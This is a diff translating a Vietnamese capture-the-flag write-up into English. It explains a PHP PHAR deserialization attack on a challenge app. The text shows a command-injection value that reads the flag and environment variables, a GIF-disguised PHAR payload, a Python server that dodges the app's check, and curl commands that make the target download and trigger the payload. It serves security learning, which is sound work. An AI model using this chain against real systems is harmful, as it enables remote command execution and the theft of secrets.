@@ -11,9 +11,9 @@ draft: false
 
 ![](./image.png)
 
-### Phân tích source code
+### Source code analysis
 
-Code của challenge:
+The challenge code:
 
 ```php
 <?php
@@ -50,30 +50,30 @@ if ($res == 0xdeadbeef){
 ?>
 ```
 
-Có hai vấn đề chính:
+There are two main issues:
 
-1. `md5_file($file)` có thể được gọi với đường dẫn do người dùng kiểm soát.
-2. Class `User` có magic method `__destruct()` gọi `system()` trực tiếp với thuộc tính `$avatar_path`.
+1. `md5_file($file)` can be called with a user-controlled path.
+2. The `User` class has a `__destruct()` magic method that calls `system()` directly with the `$avatar_path` property.
 
-Nếu ta khiến PHP parse một file PHAR chứa metadata là object `User`, PHP sẽ unserialize metadata đó. Khi request kết thúc, object `User` bị hủy và `__destruct()` được gọi.
+If we make PHP parse a PHAR file whose metadata is a `User` object, PHP will unserialize that metadata. When the request ends, the `User` object is destroyed and `__destruct()` is called.
 
-Nếu `$avatar_path` có giá trị chứa command injection, ví dụ:
+If `$avatar_path` holds a value containing command injection, for example:
 
 ```bash
 x; cat /flag 2>/dev/null; env 2>/dev/null
 ```
 
-thì câu lệnh thực tế sẽ thành:
+then the actual command becomes:
 
 ```bash
 rm x; cat /flag 2>/dev/null; env 2>/dev/null
 ```
 
-Như vậy có thể đọc flag hoặc biến môi trường.
+This allows reading the flag or environment variables.
 
-### Tạo payload PHAR
+### Creating the PHAR payload
 
-Tạo file `make_phar.php`:
+Create the file `make_phar.php`:
 
 ```php
 <?php
@@ -111,18 +111,18 @@ Run:
 php -d phar.readonly=0 make_phar.php
 ```
 
-Kết quả:
+Result:
 
 ```text
 -rwxrwxrwx 1 HieuND HieuND 252 Jun  6 09:23 payload.jpg
 payload.jpg: GIF image data, version 89a, 16188 x 26736
 ```
 
-File tuy có đuôi `.jpg`, nhưng bên trong là PHAR hợp lệ có stub GIF.
+Although the file has a `.jpg` extension, its contents are a valid PHAR with a GIF stub.
 
-### Host payload
+### Hosting the payload
 
-Do logic của app là:
+Because the app logic is:
 
 ```php
 $res = md5_file($file);
@@ -133,9 +133,9 @@ if ($res == FALSE){
 }
 ```
 
-Ta cần làm cho request đầu tiên của `md5_file($url)` fail, sau đó request thứ hai của `file_get_contents($url)` trả về payload thật.
+We need to make the first request from `md5_file($url)` fail, then have the second request from `file_get_contents($url)` return the real payload.
 
-Tạo file `serve_payload.py`:
+Create the file `serve_payload.py`:
 
 ```python
 #!/usr/bin/env python3
@@ -168,21 +168,21 @@ class Handler(BaseHTTPRequestHandler):
 HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
 ```
 
-Chạy server:
+Run the server:
 
 ```bash
 python3 serve_payload.py
 ```
 
-Public server bằng ngrok:
+Expose the server with ngrok:
 
 ```bash
 ngrok http 8000
 ```
 
-### Ép target tải payload về `/tmp/remote_file.jpg`
+### Forcing the target to download the payload to `/tmp/remote_file.jpg`
 
-Gửi request:
+Send the request:
 
 ```bash
 BASE='https://wok-tossed-pineapple-drizzled-with-torched-bread-mnee.gpn24.ctf.kitctf.de'
@@ -191,7 +191,7 @@ NGROK='https://lacey-nonorthodox-richard.ngrok-free.dev'
 curl -s "$BASE/?path=$NGROK/payload.jpg"
 ```
 
-Ở terminal Python server thấy 2 request:
+In the Python server terminal we see 2 requests:
 
 ```text
 [+] request #1 from ('127.0.0.1', 39684)
@@ -199,21 +199,21 @@ curl -s "$BASE/?path=$NGROK/payload.jpg"
 127.0.0.1 - - [07/Jun/2026 15:24:59] "GET /payload.jpg HTTP/1.1" 200 -
 ```
 
-Điều này nghĩa là:
+This means:
 
-- Request đầu tiên từ `md5_file($url)` bị đóng connection để trả về `FALSE`.
-- Request thứ hai từ `file_get_contents($url)` nhận payload thật.
-- Payload được ghi vào `/tmp/remote_file.jpg` trên server target.
+- The first request from `md5_file($url)` has its connection closed to return `FALSE`.
+- The second request from `file_get_contents($url)` receives the real payload.
+- The payload is written to `/tmp/remote_file.jpg` on the target server.
 
-### Trigger PHAR deserialization
+### Triggering PHAR deserialization
 
-Sau khi payload đã nằm tại `/tmp/remote_file.jpg`, gọi lại endpoint với `phar://`:
+Once the payload is at `/tmp/remote_file.jpg`, call the endpoint again with `phar://`:
 
 ```bash
 curl -s "$BASE/?path=phar:///tmp/remote_file.jpg/a.txt"
 ```
 
-Kết quả trả về:
+The result returned:
 
 ![](./image-1.png)
 
